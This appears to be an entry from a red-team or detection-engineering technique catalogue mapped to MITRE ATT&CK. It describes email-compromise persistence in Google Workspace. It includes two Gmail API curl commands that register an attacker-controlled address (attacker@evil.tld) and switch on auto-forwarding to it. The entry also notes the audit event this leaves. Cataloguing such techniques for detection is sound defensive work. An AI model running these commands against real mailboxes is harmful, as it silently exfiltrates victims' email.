---
id: gws-mail-forward
title: Google Workspace external mail forwarding (BEC exfil)
section: Google Workspace / identity
phase: Collection
attack:
  tactic: TA0009
  techniques: [T1114.003]
platform: [gws]
source: Google Workspace BEC (external auto-forwarding)
pair: gws-mail-forward-audit
---

The BEC classic: on a compromised mailbox, add an **auto-forwarding** rule (or a filter)
that copies mail to an external address you control — a quiet, persistent exfil channel
that keeps leaking even after you lose the session. Enabling out-of-domain forwarding
writes an `email_forwarding_out_of_domain` event to the Gmail/user audit. (Cloud IdP —
no slots.)

```sh
# register an external forwarding address, then turn on auto-forwarding to it (Gmail API)
curl -s -X POST "https://gmail.googleapis.com/gmail/v1/users/me/settings/forwardingAddresses" \
  -H "Authorization: Bearer <token>" -H "Content-Type: application/json" \
  -d '{"forwardingEmail":"<attacker@evil.tld>"}'
curl -s -X PUT "https://gmail.googleapis.com/gmail/v1/users/me/settings/autoForwarding" \
  -H "Authorization: Bearer <token>" -H "Content-Type: application/json" \
  -d '{"enabled":true,"emailAddress":"<attacker@evil.tld>","disposition":"leaveInInbox"}'
```
